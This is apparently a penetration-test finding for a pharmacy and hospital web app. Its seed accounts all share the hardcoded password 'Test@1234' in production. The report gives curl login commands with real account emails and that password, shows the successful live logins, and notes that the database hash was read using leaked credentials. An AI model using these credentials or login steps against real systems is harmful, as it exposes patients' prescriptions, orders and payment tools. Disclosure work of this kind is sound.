# Default Seed Passwords in Production — HIGH (Live-Confirmed)

## Vulnerability Summary

Every demo/seed account is created with the same hardcoded password
`Test@1234` (`src/prisma/seed.ts:39`). These accounts exist in the production
database, so any of them can be logged into with a publicly-known password.
The account set includes patients, pharmacy owners, branch managers, cashiers,
pharmacists, and hospital staff.

**Status:** ✅ CONFIRMED ON LIVE — 2026-08-11
**Severity:** High (mass account access with known credentials)

---

## 1. Vulnerability Identification Process

### 1.1 Static review

`src/prisma/seed.ts`:

```typescript
const DEFAULT_PASSWORD = 'Test@1234';
...
const password = await bcrypt.hash(DEFAULT_PASSWORD, HASH_ROUNDS);
```

The seed assigns the same hash to every demo account (`alice@patient.com`,
`bob@patient.com`, `owner@medplus.com`, `cashier@medplus.com`, …). The live DB
confirmed the seed ran: all three sampled accounts share the identical bcrypt
hash (`$2b$10$xCefJ...`).

### 1.2 Dynamic confirmation

```bash
curl -s -X POST $BASE/api/auth/login -d '{"email":"alice@patient.com","password":"Test@1234"}'
→ 200, role PATIENT, token

curl -s -X POST $BASE/api/auth/login -d '{"email":"cashier@medplus.com","password":"Test@1234"}'
→ 200, role CASHIER, token
```

BCrypt comparison against the live DB hash (read via leaked DB creds):

```
seed hash == Test@1234 → true
```

---

## 2. Attack Chain

```
Read seed.ts (public repo)
  → password = Test@1234
  → try seed emails (also in seed.ts / repo)
  → log in as patients, cashiers, pharmacy owners, managers, hospital staff
  → access their orders, prescriptions, payment tools, dashboards
```

Combined with the missing ownership checks and unauthenticated endpoints,
these known accounts act as a springboard for the payment/webhook attacks.

---

## 3. Evidence (2026-08-11)

```
POST /api/auth/login (alice@patient.com / Test@1234)        → 200 PATIENT
POST /api/auth/login (cashier@medplus.com / Test@1234)      → 200 CASHIER
DB: three sampled accounts share the same bcrypt hash == Test@1234
```

---

## 4. Files

| File | Purpose |
|---|---|
| `exploit.sh` | Enumerate + login seed accounts (parameterised) |
| `remediation.md` | Step-by-step remediation |
